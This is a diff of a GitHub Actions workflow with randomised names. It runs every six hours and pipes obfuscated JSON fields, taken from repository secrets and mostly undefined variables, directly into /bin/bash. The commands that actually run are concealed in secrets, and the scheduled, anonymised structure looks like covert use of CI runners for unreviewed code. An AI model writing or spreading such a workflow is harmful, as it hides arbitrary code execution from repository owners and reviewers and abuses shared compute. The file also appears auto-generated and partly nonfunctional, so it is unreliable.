@@ -1,29 +1,26 @@
 name: shenjingcha4189
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '16 1/6 * * *'
+    - cron: '43 3/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: shenjingcha4189
         env:
-          jh9: ${{ secrets.jh9 }}
+          zmgeq8: ${{ secrets.zmgeq8 }}
         run: |
-          echo $jh9 | jq -r .t3301 | /bin/bash
-          echo $wqqqs35155 | jq -r .o75278 | /bin/bash
-          echo $sqtg4 | jq -r .n7283 | /bin/bash
-          echo $yzet91424 | jq -r .fid80290 | /bin/bash
-          echo $cl056 | jq -r .igf32140 | /bin/bash
-          echo $og355 | jq -r .gax57461 | /bin/bash
-          echo $keuw356 | jq -r .qdhz5 | /bin/bash
-          echo $lc1261 | jq -r .zoffu4822 | /bin/bash
-          echo $fzgdk5092 | jq -r .xwqb0890 | /bin/bash
-          echo $vtjlo141 | jq -r .td2593 | /bin/bash
-          echo $nroyi589 | jq -r .npy3426 | /bin/bash
-          echo $pab07330 | jq -r .z61 | /bin/bash
-          echo $lt713 | jq -r .tmo6389 | /bin/bash
-          echo $x1749 | jq -r .qe7 | /bin/bash
+          echo $zmgeq8 | jq -r .amcq7 | /bin/bash
+          echo $zkd104 | jq -r .tkpsp903 | /bin/bash
+          echo $l4 | jq -r .ysz1 | /bin/bash
+          echo $mb00 | jq -r .xcrda4 | /bin/bash
+          echo $nwpr322 | jq -r .qlpdm04 | /bin/bash
+          echo $aaw85745 | jq -r .hjgc61847 | /bin/bash
+          echo $a726 | jq -r .s7284 | /bin/bash
+          echo $lrddp28925 | jq -r .chwn3708 | /bin/bash
 
